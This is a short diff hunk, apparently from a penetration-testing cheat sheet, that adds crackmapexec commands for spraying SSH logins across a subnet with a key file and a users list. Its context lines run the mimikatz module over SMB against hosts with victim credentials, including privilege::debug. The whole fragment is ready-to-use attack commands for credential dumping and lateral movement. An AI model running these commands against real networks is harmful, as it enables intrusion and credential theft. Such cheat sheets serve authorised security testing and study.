@@ -86,3 +86,5 @@ crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth -M mimika
 crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -M mimikatz
 crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
 
+# ssh
+crackmapexec ssh <SUBNET>.<START>-<END> --key-file <KEYFILE> -u ./users.txt [-p <KEYFILE_PASS>] [--kerberos]
